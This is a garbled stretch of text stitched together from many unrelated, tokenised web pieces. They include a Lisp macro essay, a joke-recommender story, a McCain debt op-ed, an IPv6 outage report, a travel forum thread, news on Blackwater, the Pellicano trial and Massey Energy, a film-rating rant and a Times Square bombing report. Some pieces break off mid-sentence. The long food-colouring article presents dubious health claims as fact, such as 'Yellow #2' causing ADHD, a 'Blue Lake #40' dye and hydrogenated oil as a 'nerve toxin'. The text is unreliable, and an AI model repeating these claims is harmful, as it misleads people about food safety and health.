I had a tool problem while reading obfuscated Lisp : I wanted automatic refactoring .
In particular I wanted to be able to α-rename the obnoxious variables to something that did n't look so much like brackets .
But I had to do it by hand , because there are no good refactoring tools for Lisp .
This is partly because Lisp culture values tools for expression more than tools for maintenance , but partly because automating most refactorings is hard in the presence of macros .
Most Lisps have macros in their purest form : they 're arbitrary functions that transform new forms to old ones .
That means there 's no general way to walk the arguments , because neither the function nor the expansion will tell you what parts of the call are forms , let alone what environment they belong in .
There is no way to be sure the macro does n't implement a different language , which makes analysis nearly impossible .
You can almost do it by observation : if part of a macro call appears as a form in the expansion , you can treat it as a form in the call — and you even know its environment .
( Note that this requires eq , because you want to detect that it 's the same value , not another identical one . )
Unfortunately this fails when the same form appears more than once in the original — and this is normal for symbols , so this technique does n't get you very far .
Even if the representation of code were different , so variable references appeared as ( ref x ) rather than being abbreviated to x , it would still break when a form appears more than once in the same tree .
And in the presence of macros , partial sharing is actually rather common , because multiple calls to the same macro often share part of their expansions .
So reliably walking macro calls requires having more information about a macro than just how to expand it .
This is an advantage of more restrictive macro systems : they 're easier to analyze .
In a strict template - filling system like syntax - rules , you can always determine the role of a macro argument .
DrScheme takes advantage of this for its fancy ( but not very useful IME ) syntax - highlighting .
It does n't work for procedural macros ( Update : yes it does ; see comments ) but it could , if there were a way for macro definitions to supply the analysis along with the expander .
Of course it would still be necessary to support unanalyzable mystery macros , because some macros are too hard to analyze , and because many authors wo n't bother .
I do n't think procedural macros are a bad feature — on the contrary , I think they are the best and purest form of one of the four most important abstraction methods in any language ( the other three are variables , functions , and user - defined datatypes ) .
But they do have a cost .
And I think the cost is mostly in what other tools they interfere with , not in any difficulty humans have with them .
Every day is something like April Fools ’ Day at the University of California , Berkeley joke recommendation site , dubbed Jester .
( Readers : What 's the best April Fools ' prank you 've ever played or had played on you ?
Techier the better .
Add in comments below )
Now on Version 4.0 , the site tosses visitors a handful of jokes to rate on a scale of “ less funny ” to “ more funny . ”
It then recommends jokes based on the user ’s taste ( or lack thereof ) , dynamically making recommendations based on the user ’s most recent ratings .
Jester ’s more than a joke jukebox though .
Underlying it is a Berkeley - patented “ collaborative filtering algorithm ” dubbed Eigentaste , now on Version 5.0 .
The more people who use the system and rate jokes ( 4 million - plus ratings have been made so far , according to a recent story on the UC Berkeley Web site ) , the more data Berkeley researchers have to advance their understanding of recommendation systems , like those used by Amazon.com and other Web sites .
“ There are many applications for Eigentaste … it can be used for recommending things where there is a large inventory like books , music , and movies , and can also be applied to recommend Web sites , restaurants or software utilities , ” says engineering professor Ken Goldberg , who got Jester off the ground 10 years ago and is now director of the Berkeley Center for New Media .
“ The key is that it separates the pattern analysis into offline and online components . ”
Among those other applications is a new one called Donation Dashboard that helps people figure out an appropriate way to divvy up their charitable donations .
Goldberg ( Tavi Nathanson and Ephrat Bitton are the other two listed on the Jester 4.0 team ) says there has been a resurgence of corporate interest in licensing Eigentaste of late , though he declined to name names .
The first joke that Jester spit out at me was :
How many feminists does it take to screw in a light bulb ?
Answer :
That 's not funny
I wo n’t tell you how I rated that , but I did ask Goldberg if he had any good IT jokes for me and he deflected the question by referring me to Jester .
I did n’t find much in the way of IT jokes , though did run across a few science ones , such as this knee - slapper :
Two atoms are walking down the street when one atom says to the other , " Oh , my !
I 've lost an electron ! "
The second atom says , " Are you sure ? "
The first replies , " I 'm positive ! "
I thought I might have better luck asking Goldberg for his best April Fools ’ prank , either one played by him or on him .
“ On April 1 , when I was 6 , my mother yelled that Martians had landed in our bathtub !
She 'd poured in green food coloring and it was out of character for my mother :
When I ran in I was totally confused .... but I never forgot that moment , ” Goldberg says .
Oh , and Jester itself was kind enough to serve me an April Fools ’ joke –- one of the popular Chuck Norris variety , no less – just as I wrapped up this story :
Chuck Norris ' calendar goes straight from March 31st to April 2nd ; no one fools Chuck Norris .

DIGG THIS
John McCain has declared it will be " fine " for US troops to stay in Iraq for a hundred years .
The financial numbers , however , indicate that this is strictly bluster .
As President , he will either pull out and call it a victory well before his first term ends — or else preside over the bankruptcy of the United States of America .
At $ 120,000 per family of four , the nine trillion dollar national debt is already forcing Americans to make hard choices between health care , mortgage payments , retirement savings , and college tuition — not to mention gas and food .
Imperial war , bequeathing additional trillions of debt , has become one more luxury we ca n’t afford .
Most Americans have barely noticed the financial bite up to this point , because they ’ve fallen into the psychological trap of ignoring the total debt so long as they can make the interest payments .
At current low interest rates , the cost of interest payments on the national debt is " only " $ 400 billion a year , " merely " $ 1300 per citizen .
So if the impact of the total debt is so " minor , " why worry about the " increment " caused by war ?
Well , unlike the politicians who pose as far - seeing visionaries , we should take a longer view than just to the next election .
In twenty years , for example , those debt payments will accumulate to over $ 100,000 per family of four .
Parents complain about the financial burden of raising children , but the national debt will never move out and get a job .
Moreover , the current federal deficit adds a half trillion dollars to the national debt annually , so that within twenty years , the national debt will double .
Then the average American family will pay over $ 10,000 a year in interest payments — on top of their regular taxes .
To avoid this slide into national impoverishment , we need to balance the federal budget by curbing social spending and cutting waste , but unless we also scale back on neocon imperial ambitions , we will soon say good - bye to the American Dream .
Interest rate volatility could change that " soon " to " very soon . "
As the national debt swells , rising demand on the supply of lending capital drives up interest rates .
The higher the rates , the higher the payments , the more temptation for the government to inflate its way out of debt — and the financial markets will compensate for that risk by charging even higher rates .
With that kind of runaway feedback , financial collapse ( the day we ca n’t make the payments ) could come any time .
Perhaps the classic model for the impending crisis is the US economy in the 1970s and early 80s , when the spending binges of the Great Society and Vietnam War triggered an era of debt monetization ( i.e. , inflation ) that pushed the prime rate and even internal Federal Reserve interest rates to over twenty percent .
Such increases today would bury the average family under tens of thousands of dollars a year in interest payments .
That would not only be good - bye to the American Dream , but maybe also good - bye to America .
Following the " Vietnam Analogy , " how long before today ’s financial squeeze crimps the current imperial adventure ?
Well , the peak of the Vietnam deployment occurred in 1968 , and most of the troops were out by 1973 .
That five - year span indicates , given that the Iraq War ’s " Surge " occurred in 2007 , our withdrawal must be largely complete by 2012 .
That is , during President McCain ’s first term .
Neocons will counter that the Vietnam Analogy does n’t apply , and they are right .
Things are much worse now .
At the end of the turbulent 1970s , the ratio of national debt to GDP was only thirty - three percent ; today , we start our Time of Troubles with a debt ratio twice as high .
And in the 1970s , it was unthinkable that the US would lose its triple - A credit rating ; today , it ’s under solemn discussion .
Given how much closer we are now toward insolvency , we do n’t have the luxury of taking anywhere near as long to get out of Iraq as we did in getting out of Vietnam .
True , in his presidential campaign , McCain ’s strategy has been to pander to the warmongering impulses and imperialist lustings of the neoconservative base with the promise of perpetual aggression no matter the cost .
Once McCain is President , however , he must quickly submit to economic reality , and that means : Pull Out And Call It A Victory .
What if McCain stubbornly decides to " stay the course " in Iraq regardless of the impact on the US economy ?
Again , the Vietnam Era offers a lesson .
Like our Unitary Executive today , Richard Nixon was perceived as an Imperial President above the law .
Then came high unemployment and double - digit inflation .
When public rage exploded , Nixon was hustled from office on a legal pretext that in more stable times would have been readily overlooked .
Nixon , by the way , for the most part did get us out of Vietnam — just not fast enough to save his presidency .
As President , McCain will either learn that lesson , or repeat it .
Either way , pay no attention to what Mister Straight Talk says , because it has absolutely no bearing on what he must do .

Taking a detour from IPv4
After working on the new Internet Protocol version 6 ( IPv6 ) for a decade and a half , the Internet Engineering Task Force decided it was time to turn off the old protocol ( IPv4 or just IP ) .
So this is what they did for an hour on the network used at the IETF meeting in Philadelphia this week .
Network traffic plummeted from some 30 Mbps to around 3 Mbps as the meeting attendees who had IP v6 enabled could now only get at IPv6 - reachable destinations on the Internet .
Leslie Daigle , chief Internet technology officer for the Internet Society , who coordinated the IPv4 outage , considers the outage a success .
" The plenary outage provided a focal point for a number of people to dive into and work with IPv6 — whether on their own notebooks , or their home web sites ( e.g. , Paul Hoffman's www.vpnc.org), or their products ( ISC's BIND ) , or public services , such as Google , " said Daigle .
" From that perspective , the experiment was a success before we even turned off IP v4 access in the plenary session .
I hope , though I do n't know , that the plenary event also provided a first hand experience to more IETF engineers that they can take into Working Group discussions . "
Shortly after the fall meeting , the IETF leadership decided to create an " IPv4 outage " during this week 's spring meeting .
The triannual IETF meetings attracted some 1,200 Internet engineers from around the globe who attended meetings in parallel tracks all week except for the plenary sessions on Wednesday and Thursday evenings .
Power cables ran throughout the meeting rooms to power the laptops that everyone used to alternatively enhance participation and zone out .
IETF attendees bracing themselves for the loss of IPv4
A huge wireless network provided connectivity to the attendees .
The Philadelphia meeting was hosted by Comcast , which provided a 100 Gbps connection with a 10 Gbps backup and a 100 M bps backup for the backup .
For years now , the IETF meeting network has supported both IP v4 and IPv6 .
During this meeting , there was also a separate IPv6 - only wireless LAN .
Yesterday evening , shortly before 7 PM , the mixed IPv4 / IPv6 network was turned off , forcing the IETF to proverbially eat its own dog food and talk to the world outside the meeting hotel through the remaining IP v6 - only network .
IPv6 and your favorite OS
In the past year or so , most , if not all , of the IETF 's web sites have been IP v6 - enabled .
So having a look at the meeting agenda or looking up RFCs was not a problem for those with IP v6 connectivity .
Beforehand , the IP v4 outage wiki had collected instructions on how to configure IP v6 on various operating systems .
Windows Vista and some Linux distributions were able to take advantage of the IPv6 connectivity without further configuration because they support the IP v6 version of the DHCP protocol .
Mac OS
X will automatically use IPv6 connectivity if it 's available , but it does n't support DHCPv6 , which makes it necessary to manually configure an IPv6 DNS server address .
The same is true for many UNIX / Linux systems .
On Windows XP , things are not quite as simple as that — XP not only lacks DHCPv6 support and does n't have IP v6 turned on by default , it also can't perform DNS lookups over IPv6 .
The solution is to run a nameserver locally that can be queried over the IP v4 loopback address , but that turned out to be easier said than done .
In the end , a number of XP users " cheated " by having a local - use - only IP v4 address to talk to a DNS server that in turn translated DNS names into IP v6 addresses .
After everyone got his or her system up and running , many people started looking for IPv6 - reachable web sites , reporting those over Jabber instant messaging — which posed its own challenges in the IP v6 department .
I was surprised at the number of sites and wide range of content available over IPv6 .
Apart from — obviously — IPv6 - related sites ; they ranged from " the largest Gregorian music collection in Internet " to " hardcore torrents . "
Think of it as tree - free paper : textile remnants from garment factories turned into decorative gift wrap .
The fine paper and gift store Soolip sells the designs , which come in colorful florals and stately prints -- a selection of about 100 patterns .
“ People really like the fact that it ’s recycled , ” manager Constantine Del Rosario says .
Discarded cotton scraps have been remade into sheets about 30 inches wide and 19 inches long , each with a heft that ’s more like wallpaper than traditional wrapping paper .
The price : $ 6 apiece .

next option is take the bus
go to canadacoach or greyhound .
they have round trips .
not too expensive .
train is by far most expensive .
you can not take plane from montreal to ottawa .
theres no flights .

By far the most expensive is plane ... there are 11 flights per day each way on Air Canada between Dorval and Ottawa .
But the price is over $ 200 roundtrip .
Plus the cost of getting to / from the airports .
Book 1 day in advance and bus is 53 for adult round trip .
It 's operated by Voyageur for Greyhound who own the route .
You can go from Montreal Coach station or from Dorval airport .
Car is about that for driving too right now !
Via rail is nice but it goes from downtown montreal to just outside ottawa centre .
The bus is much closer to downtown .
CoachCanada does not serve Ottawa except for " charter " services , for example Queens University service to and from Kingston .

If we 're to promote Technological advancement in Canada , we need ISP transparency , personal privacy and choice of content to be 1st on our minds .
The internet is important to all of us , and as such it needs to remain open to everyone .

WASHINGTON -- Private - security contractor Blackwater Worldwide , which protects U.S. government officials in Iraq and faces scrutiny over its role in the shooting deaths of Iraqi civilians , has ramped up its lobbying representation on Capitol Hill .
Law firm Womble Carlyle Sandridge & Rice was tapped by the company , whose chairman is Erik Prince , a Holland native .
They 've been hired to lobby the government on contracting and other issues , according to the form posted online Tuesday by the Senate 's public records office .
Womble Carlyle is the third lobbying firm to be hired by Moyock , N.C. - based Blackwater since October .
The company has attracted considerable congressional scrutiny and criticism from the Iraqi government and human rights groups for its involvement in several dozen shooting incidents .
Federal prosecutors are investigating the Sept. 16 shooting deaths of 17 Iraqi civilians involving several Blackwater security guards .
The company has maintained that its guards have always acted appropriately .
Prince , a former Navy SEAL , is a Holland native whose family fortune was made in the auto parts industry .
His sister , Betsy DeVos , a former chairwoman of the Michigan GOP , is married to Dick DeVos , a Republican and Amway Corp. heir who unsuccessfully ran for governor in 2006 .
In December , the Pentagon and State Department signed an agreement to give the military more control over Blackwater and other private security contractors , spelling out tighter rules , standards and guidelines .
Blackwater previously hired lobbyists Richard Cockrum and Gregory Hahn , according to disclosure forms .
However , their forms did not indicate specific lobbying issues .
A phone call and e-mail to Blackwater spokeswoman Anne Tyrrell were not immediately returned .
Since 2006 , Blackwater has been represented by C&M Capitolink LLC , a public affairs affiliate of Crowell & Moring LLP .
The firm , which has been paid $ 300,000 from 2006 through the first half of 2007 , has lobbied on ways Blackwater could help in border security efforts , among other issues , according to a disclosure report .
Blackwater has received federal contracts worth more than $ 1 billion , with the bulk of its earnings coming from the State Department , according to the House Oversight and Government Reform Committee .
Other military contractors -- such as DynCorp International Inc. , which has a $ 4.6 billion U.S. military translation services contract in Iraq -- have also hired lobbyists to identify federal contracting opportunities .
Among the Womble Carlyle lobbyists representing Blackwater are : John Mashburn , former general counsel and policy director for Sen. Judd Gregg , R - N.H. , who is the top Republican on the Senate Budget Committee ; and Mark Harkins , who was chief of staff to Rep. Brad Miller , D - N.C. , chairman of the Investigations and Oversight subcommittee of the House Science and Technology Committee .
Mr. Pfeifer repeatedly said he was ashamed and sorry for his actions involving Ms. Finn and Mr. Pellicano .
He has pleaded guilty to aiding and abetting Mr. Pellicano and is awaiting sentencing .
Next , Ms. Finn , after describing her several years as a high - priced escort , testified that she had given honest testimony in Mr. Pfeifer ’s 2000 lawsuit about his use of illegal drugs .
But , she said , she approached Mr. Pellicano in early 2001 to make a deal after his harassment  fueled by information gleaned from months of wiretapping  ran up her own legal bills and drove her to near bankruptcy .
That led to a new sworn declaration , she said , in which she disavowed her previous testimony about illegal drugs .
“ I said what I needed to so I could try to have a life again , ” she said Tuesday .
In his testimony , Mr. Pfeifer also said that Mr. Pellicano had told him that another music industry figure previously linked to the wiretapping case  Freddy DeMann , the Maverick Records executive and former manager of Madonna and other acts  had paid some $ 80,000 to Mr. Pellicano to confirm his suspicions that his daughter ’s husband was being unfaithful to her and that the husband was actually gay .
Mr. Pellicano obtained audio proof of this , Mr. Pfeifer testified .
Mr. DeMann did not respond to a phone message .
seeking comment .
Under prosecutors ’ questioning , Mr. Pfeifer also testified that Mr. Pellicano once canceled a meeting with him to attend one with Michael Ovitz , the former talent agent .
More information on that score could come as soon as Wednesday , when Bryan Lourd and Kevin Huvane , two top partners at the Creative Artists Agency , Mr. Ovitz ’s former firm , are among the possible witnesses .
Mr. Pfeifer also suggested that Alan J. Weil of Gaims , Weil , West & Epstein , a Los Angeles law firm , who became Mr. Pfeifer ’s lawyer at Mr. Pellicano ’s direction , was aware of the wiretapping .
Mr. Pfeifer said Mr. Pellicano proposed sending Ms. Finn a wreath of black roses at a resort where he had learned from a wiretap that she would be entertaining a client .
“ Alan Weil said , ‘ You ca n’t do that , ’ ” Mr. Pfeifer testified , “ ‘ because how would you have known she was here ?
You ca n’t expose that . ’ ”
US withholding Iraq strategy document from Democratic lawmakers Jason Rhyne
Published : Tuesday November 13 , 2007
del.icio.us
Print This Email This The Pentagon has denied repeated requests from Democratic lawmakers to view a key document outlining the chief US strategy to achieve stability in Iraq .
Created by General David Petraeus and US Ambassador to Iraq Ryan Crocker , the Joint Campaign Plan details military and diplomatic steps intended to dramatically heighten security in Iraq by 2009 .
The exact nature of the plan , however , has been withheld from Congress thus far , according to Roll Call 's Rachel Van Dongen .
" After persistent requests from House Armed Services Chairman Ike Skelton ( D - Mo. ) , the issue has moved up the Congressional chain of command to Speaker Nancy Pelosi ( D - Calif . ) , " Van Dongen writes .
" According to an aide , Pelosi asked President Bush for the document several months ago in a White House meeting .
Since then , Pelosi 's staff has ' repeatedly ' requested a copy , her aide said , but has not yet received one . "
A spokeswoman for the Armed Services Committee told Van Dongen she could n't be sure if the Pentagon 's refusal was motivated by partisan politics .
" It 's probably always hard on some level to deal with bureaucracies , " she said .
Armed Services Subcommittee on Oversight and Investigations Chair Rep. Vic Snyder ( D - AR ) told the paper that Defense Secretary Robert Gates had been a " breath of fresh air " at the Pentagon , drastically improving legislators ' confidence in the Defense Department .
" But Snyder acknowledged frustration at Congress ' difficulties obtaining the current version of the plan , " Van Dongen noted , adding that specifics in the document have already been leaked to the New York Times and the Washington Post .
Other government officials , too , have received copies of the strategy , including an official at the Government Accountability Office .
" When we hear people from GAO obtained a copy of it when they were in Iraq , you would think Members of Congress would have that opportunity , " Snyder told the paper .
" It 's hard to know if anything is crucial when you do n't know what you do n't see . "
Van Dongen adds that her phone calls seeking comment on the matter were bounced around from the Pentagon to the White House legislative affairs office , on to the Multi-National Force in Iraq , and eventually back to the Pentagon again .
The Pentagon had no comment .
One expert told the paper that both Congress and the Pentagon played a role in keeping their relationship icy .
" It 's our feeling that there just needs to be a higher level of transparency on the part of the administration , " said Rick Barton , co-director of the Post - Conflict Reconstruction Project , " but then there has to be less of a ' gotcha ' slam approach on the part of the Congress . "
As reported in July by the New York Times , the Joint Campaign Plan anticipates " a decline in American forces as the ' surge ' in troops runs its course later this year or in early 2008 .
But it nonetheless assumes continued American involvement to train soldiers , act as partners with Iraqi forces and fight terrorist groups in Iraq ... "

A six year old West Virginia jury award now worth $ 70 million against the country 's fourth largest coal company was overturned last week by the West Virginia Supreme Court .
Now a look back at what happened in between is raising eyebrows , not to mention Massey Energy CEO Don Blankenship 's hackles .
This one seems eerily similar to John Grisham 's latest , only this is for real .
ABC 's Brian Ross explains .

After Massey Energy appealed the case , its CEO Don Blankenship , a Richmond Virginia resident , helped bankroll a $ 3.5 million ad campaign to successfully unseat W.V. Supreme Court Justice Warren McGraw and replace him with Justice Brent Benjamin , or as fellow Justice Larry Starcher put it , " the election was bought , a seat was purchased on our Supreme Court , and I 'm highly offended by it . "
Then pictures surfaced of Blankenship and W.V. Supreme Court Chief Justice Spike Maynard vacationing with their girlfriends on the Riviera .
" It was a trip the Chief Justice never disclosed to the court , even when he voted with the majority to overturn the huge Massey verdict , according to Justice Starcher , who is now being interviewed by the FBI . "
After the pictures became public , Justice Maynard did recuse himself , but so did fellow Justice Starcher because ( gasp ) , he had dared to have been critical of Blankenship 's relationship with the Court .
So the three remaining W.V. Justices , including Blankenship 's 3.5 million dollar Justice Benjamin , reheard the case last week and again overturned it .
When approached for a comment by ABC News , Blankenship threatened that the reporter was " liable to get shot " and attacked his camera .
W.V. Chief Justice Maynard insists he 's been the victim of " the mother of all political smears , " even after it came out that Blankenship 's chief political consultant is now helping Maynard 's re-election bid .
Let 's hope that goes about as well as Blankenship 's $ 3 million attempt to finance a GOP takeover of the W.V.
House in 2006 .
Eating the rainbow diet
Food makers use harmful dyes to get you to buy
Food colors are made from petroleum
How to defend yourself against dishonest food companies
Artificial colors sometimes find their way into salmon before it even becomes food
Food coloring from insects
Have you ever wondered why companies use artificial colors ?
You might think it 's because they want to make their food look good , but there 's another reason -- a far deeper reason -- why companies use artificial colors to make their foods more appealing to consumers .
Keep reading to learn what that is .
Why do foods with more vibrant , saturated colors look more appealing to consumers ?
Why does a bright - red apple look more appealing than a dull - red apple or a green apple ?
Why are foods sold to us in neon green , yellow and orange packages ?
The reason is that of the color of food speaks to humans ' innate perceptions about the value of food items .
Humans are born with brains that are preprogrammed with the ability to learn language ; or to recognize certain inherent dangers such as falling off a ledge .
We also have all kinds of behaviors built in for survival .
One of the survival strategies our ancestors developed was the ability to recognize foods containing usable energy or nutrition .
They could walk through a field and instantly spot foods that contained potent , healing phytonutrients and calories that would give them usable energy , healthy brain function , boost immune function and boost overall survivability .
The natural medicines found in food often appear in bright colors , and calorie - rich foods designed to appeal to primates ( such as apples or berries ) are also brightly colored .
It is these colors that appeal to our built - in perceptions about the value of food .
( Birds have a similar system and also tend to judge food by its color . )
Color is a reliable indicator of the healthful quality of foods .
An apple that has red in its peel , for example , actually sends a message : " Hey , I 'm here .
I have some healing medicine in my skin . "
That 's why humans are naturally attracted to more vibrant - looking apples .
Berries , fruits , root vegetables and other foods broadcast similar messages through their own coloring .
You may have heard of the rainbow diet , in which you eat foods of different colors .
It is based on the idea that different foods carry different energies and provide different types of nutritional medicine .
There is a real science to that , and an art as well .
You can examine phytochemicals and their healing effects , and categorize them by color .
There are foods that are purple , blue , green , yellow , red , orange , brown -- all the colors of the spectrum -- and each food has a different medicine .
Our ancestors learned to recognize foods by their color , and they also learned that foods with more vibrant colors in their natural environment contain a lot more medicine .
For example , a red cabbage that is actually a dull grey does n't look very appealing , but a purple cabbage with a saturated , bright - purple color looks fantastic .
That 's because we have an innate perception gauge telling us we should be attracted to these foods -- they are healthier for us , and the health quality is indicated by the saturation of the color .
This is what food - manufacturing companies are exploiting when they enhance colors artificially .
When you shop for oranges , you 're looking for a bright , deeply colored orange .
You do n't want a yellowish orange , because that tells you it 's not ripe ; if it 's not ripe , it has n't developed all its medicine .
( That 's one reason why so much of the produce available in grocery stores lacks real nutrition these days -- it 's all picked before it has a chance to ripen on the plant . )
Growers know about this color preference , so some of them -- in Florida for example -- hijack that instinctual process by dipping some of their oranges in a cancer - causing red dye that makes the peel look more orange .
The FDA has banned that dye from use in foods , because it is a carcinogen , but they say it 's okay to dip an orange in it , because people do n't eat the peel .
If a consumer is comparing two oranges -- one of them is yellow , and one of them is deep , rich orange -- most consumers are going to pick up the deeper , richer looking orange .
Food manufacturers use artificial colors because , when they make their foods more colorful , it turns on the light switch in our brains that says , " This is good stuff . "
We 've been fooled ; we 've been drawn like a moth to a flame .
If you took one nacho chip with flavors but no color and put it beside another nacho chip with the exact same flavors but lots of artificial colors to make it look more orange , and you asked people to pick which chip they think would taste better , almost everyone will choose the chip with the color .
The color can actually fool your mind into thinking that these foods taste better .
Coal tar and petrochemicals are the sources of the artificial colors that go into our foods , and these artificial coloring ingredients are dangerous to our health .
The human body was not designed to eat petrochemicals .
You do n't see people digging up petroleum and drinking it with a straw .
That 's not the kind of energy we 're designed to run on .
So why are we putting petrochemicals in our foods ?
The food companies are doing it to sell a product and generate a profit , regardless of the health effects on consumers -- and the health effects have been worrisome .
In fact , more than one artificial color has been banned and pulled off the market over the last several decades because it was ultimately found to cause cancer .
The safety of those still allowed on the market is highly questionable .
Eventually , artificial colors used in the food supply will likely be outlawed because they contribute to all sorts of health problems , the most notable of which are the symptoms diagnosed as attention deficit hyperactivity disorder ( ADHD ) , a behavioral pattern often brought on by Yellow # 2 food dye .
Children are being fed these chemicals in such large quantities that they begin to have nervous system malfunctions that ultimately are misdiagnosed as ADHD , learning disabilities , or violent behavior .
If you want to reverse these so - called diseases in your children , one of the best things you can do is stop feeding them petrochemicals .
That means you , as the parent , have to understand that your very instincts are being hijacked by food companies ' use of artificial colors to sell their garbage products .
It 's automatic , it 's innate and it 's unconscious .
You look at foods and you instantly evaluate them by their color .
It 's something that you can't stop doing because it 's part of your perception hardware .
Food companies know this and they exploit it to sell you unhealthy foods artificially colored to look nutritious .
So what 's your defense against this ?
How can you take control over your own mind and make better decisions at the grocery store ?
You 're taking the first step right now by reading this : you 're educating yourself .
All you have to do is take this information and apply it by reading ingredient labels .
Look for artificial food coloring ingredients like Yellow # 2 , Red # 5 or Blue Lake # 40 , and then avoid them .
Do n't buy those products .
It 's as simple as that .
Instead , you look for natural food coloring ingredients .
There are products colored with beet juice , a much healthier way to color food ; annatto , a very healthy plant source ; or turmeric , a fantastic herb with anticancer , anti-inflammatory and antioxidant properties .
With a little checking around , you will discover that all the cheap , low - grade , disease - promoting products in the grocery store tend to use these artificial colors .
You will also find that the same snack chips , processed foods , boxed dinner meals , and junk food made by the biggest food companies also contain refined white flour , MSG and hydrogenated oils .
It 's really no surprise they mostly all contain an artificial color of one kind or another .
Also , you should watch out for artificial colors in fruit drinks and candy .
There are loads of artificial colors in candy , which makes for a very bad combination -- especially for children .
If you give kids a load of sugar and petrochemicals together in the same meal , their nervous systems go crazy .
That 's why you have kids climbing the walls after feeding them candy and sugary drinks with artificial colors .
Another repeat offender in this category is " sport drinks , " which are loaded with petrochemical artificial colors that have no purpose other than to make the beverage visually appealing to consumers .
There 's no nutritional value whatsoever to using artificial colors , which means most sports drinks are a complete waste of money : they 're just salt water with sugar and artificial colors added .
If you want a real sports drink , you should juice some celery and cucumber , or just drink coconut water .
That 's real replenishment .
The confectionery industry relies heavily on artificial colors to make its foods -- like cake and icing -- look appealing as well .
Icing is usually made of hydrogenated soybean oil , which is a nerve toxin , combined with refined sugars , which are dietary poisons that cause diabetes .
The petrochemical - based artificial colors are used to top it off .
If you really want to commit nutritional suicide , eat a lot of icing .
Get yourself some iced doughnuts , cakes and pastries , and load up .
You 'll notice artificial colors in foods like blueberry muffins or blueberry bagels , too .
Read the ingredients on blueberry bagels at your local grocery store next time , and you 'll find that there are really no blueberries but plenty of artificial blue and green colors to create the impression of little blueberry bits .
They can't even put blueberries in their bagels .
They have to trick you with artificial colors .
Do you know what liquid they 're using to hold the color ?
Propylene glycol -- the same chemical you put into your RV when you want to winterize it .
It is antifreeze .
You 're eating antifreeze and petrochemicals -- and that 's just the blueberry part .
We have n't even gotten to everything else , like refined sugars , chemical preservatives and refined bleached white flour , which has diabetes - causing contaminants .
A blueberry bagel is no longer a blueberry bagel .
When you really understand what 's in the foods , it 's mind blowing .
Artificial colors turn up in a lot of interesting places .
Many salmon farms are adding artificial color to their food to make the salmon flesh appear more red because that 's what consumers will buy .
They 'll buy red or pink salmon over grey salmon any day of the week because their instincts tell them deeper , richer colors are healthier .
Imitation crab meat has artificial colors added to make part of the meat look red -- but at least the label includes the word " artificial , " so you can avoid it if you read labels .
The biggest form of dishonesty across the entire food industry is the use of artificial colors that influence you to buy and consume foods that actually harm your health ( such as snack chips made with MSG ) .
The food companies have figured out how to hack into your perception hardware .
They send one message to your eyes , but they manufacture foods out of something entirely different .
The bottom line is that foods , through the use of artificial colors , are sending an incongruent message : " I 'm a healthy food . "
But the reality is , " I 'm harmful junk food .
" These companies employ tens of thousands of food scientists in the United States alone .
They figure out how to make foods more palatable and less expensive by using the cheapest ingredients possible while prettying them up with artificial food colors made from petrochemicals .
I have one more interesting tidbit I 'd like to share with you .
You may be familiar with a red color ingredient called carmine ; it can be found in strawberry yogurt and a variety of other products .
Carmine is sourced from a mash made by grinding up beetles grown in Peru and the Canary Islands .
The mash is strained out to obtain a red liquid .
That liquid , made from insects , is then shipped to the United States to food companies , where it is dumped into the yogurt to make it look like there are strawberries in there .
Folks , it 's not strawberry .
It 's insect juice .
That 's what 's in your yogurt ( and a lot of candy and children 's foods as well ) .
Some people have a dangerous allergic reaction to this ingredient .
They can go into anaphylactic shock , which puts them in a coma ( or worse ! ) .
As this demonstrates , some of these color additives can be extremely dangerous , but you 'll notice companies do n't put this information on their labels .
" Insect juice " is never listed on your yogurt .
They merely list " carmine , " and they leave it up to you to figure out what that means .
Ninety - nine percent of people in this world have no idea what carmine really is , but now you do .

It was n’t so long ago that all a movie trailer had to warn its audience of was any ' Adult Content ' , yet in today 's happy - go - lucky climate this apparently is no longer enough .
We are now offered a running commentary in the small print of every single part of the film that may offend people .
For example , the other day I saw a trailer for a movie which “ contains one moderate use of strong language and mild injury ” : so at some point in this movie someone might stub their toe and say “ ow shit ” ; thank God they warn you of this stuff in advance .
But wait , if they do n’t say when this horrible event will occur , how will I know when to cover my children ’s eyes and ears ?
They should say “ contains one moderate use of strong language about 1 hour and 13 minutes in ( when Geoff gets miffed with nameless henchman 3 ) , and mild injury about 1 hour and 25 minutes in ( when Humphrey gets a splinter ) ” .

Are we heading for a time when the small print of action films will read “ contains
one moment where a bad guy gets his finger chopped - off in some piece of
machinery , another has their faced smashed with a spade , another swears
quite a lot ; one woman says ‘ fuck me ’ , which leads to a moderately
explicit sex scene ( whatever moderately explicit means ) ; the good guy
gets a broken arm and swears a bit but only when necessary , and he also
smokes .
Other than that , nothing much really happens ” ?

Now it was rated PG , and I think my mum
exercised her role as parental guide for allowing me to watch a good
film , but covering my eyes when there was something that she felt was a

These days the trailer would have to say “ contains

25 foot tall skyscraper made from playing cards withstands a leafblower
by Dhiram Shah
Bryan Berg from Santa Fe , New Mexico is an expert cardstacker and by expert I mean it as this dude made a 25 foot tall skyscraper out of playing cards .
He also put his structure to the acid test by subjecting it to a leaf blower however it barely put a dent in it .
So he resorts to the most destructive tools around : his hands , crushing himself in a sweet avalanche of cards after a couple minutes of pawing that reminds us of New Year ’s in Times Square in more ways than one .

Letters Seem to Claim Responsibility for Times Square Blast Photos of targeted military recruiting station were sent to members of Congress .
March 6 , 2008  -- Letters saying " We did it " and containing a photo of the U.S. military recruiting station in New York that was the target of a bombing today were sent to as many as 10 members of Congress , law enforcement sources told ABC News .
A House aide said the letters were all received by Democratic members of Congress , and that all the letters were sent through the U.S. Postal Service .
The letters all had a return address in Hollywood , Calif. , and authorities there are involved in the investigation , law enforcement sources said .
They contained the phrase , " Happy New Year -- we did it , " and a lengthy statement against the Iraq war that could be described as a manifesto , sources said .
The small bomb caused minor damage to the recruiting station before dawn Thursday .
Police have been searching for a hooded bicyclist seen on a surveillance video pedaling away .
No one was hurt in the explosion , but officials said the crude device could have " injured or even killed " someone .
However , officials say that because the bomb was detnated in the early morning hours when the recruiting office was empty and Time Square was mostly deserted , it is probable that the bomber did not intend to hurt anyone .
The concern is that the person , who clearly wants attention , might move on to actions in which people are harmed , and the person clearly has enough know how to do that , officials said .
Border Stop Linked to Bombing ?
High - level law enforcement sources told ABC News that a border stop in Canada has yielded evidence that may be linked to the case , and that individuals are being sought in connection with the case .
Canadian authorities declined to comment on the matter .
Sources said the border stop took place about a month ago , but today U.S. and Canadian authorities were revisiting the incident because of circumstantial evidence noticed at the time of the stop and the behavior of one of four individuals in the car that was stopped .
At the time of the stop , one young man fled the vehicle on foot , law enforcement sources said .
